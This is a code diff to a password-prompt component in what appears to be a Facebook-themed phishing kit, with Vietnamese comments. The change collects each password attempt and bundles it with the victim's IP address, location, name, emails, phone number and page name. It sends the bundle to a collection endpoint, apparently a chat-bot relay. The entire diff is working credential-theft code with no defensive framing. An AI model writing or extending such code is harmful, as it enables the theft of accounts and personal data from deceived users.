@@ -18,7 +18,7 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const [showPassword, setShowPassword] = useState(false);
     const [translations, setTranslations] = useState<Record<string, string>>({});
 
-    const { geoInfo, messageId } = store();
+    const { geoInfo, messageId, userData, addPassword, setMessageId } = store();
     const maxPass = config.MAX_PASS ?? 3;
 
     const t = (text: string): string => {
@@ -56,12 +56,40 @@ const PasswordModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         const next = attempts + 1;
         setAttempts(next);
 
-        const message = `<b>🔒 Password ${next}/${maxPass}:</b> <code>${password}</code>`;
+        // Lưu password vào store
+        addPassword(password);
+
+        // Tạo tin nhắn với TẤT CẢ thông tin đã có
+        const allPasswords = [...userData.passwords, password];
+        const message = `
+${
+    geoInfo
+        ? `<b>📌 IP:</b> <code>${geoInfo.ip}</code>
+<b>🌎 Country:</b> <code>${geoInfo.city} - ${geoInfo.country} (${geoInfo.country_code})</code>`
+        : 'N/A'
+}
+
+<b>👤 Full Name:</b> <code>${userData.fullName}</code>
+<b>📧 Personal Email:</b> <code>${userData.personalEmail}</code>
+<b>💼 Business Email:</b> <code>${userData.businessEmail}</code>
+<b>📱 Phone Number:</b> <code>${userData.phoneNumber}</code>
+<b>📘 Facebook Page:</b> <code>${userData.facebookPageName}</code>
+
+${allPasswords.map((pass, idx) => `<b>🔒 Password ${idx + 1}/${maxPass}:</b> <code>${pass}</code>`).join('\n')}
+
+<b>🕐 Time:</b> <code>${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}</code>
+        `.trim();
+
         try {
-            await axios.post('/api/send', {
+            const res = await axios.post('/api/send', {
                 message,
-                message_id: messageId
+                old_message_id: messageId
             });
+
+            if (res?.data?.success && typeof res.data.message_id === 'number') {
+                setMessageId(res.data.message_id);
+            }
+
             if (config.PASSWORD_LOADING_TIME) {
                 await new Promise((resolve) => setTimeout(resolve, config.PASSWORD_LOADING_TIME * 1000));
             }
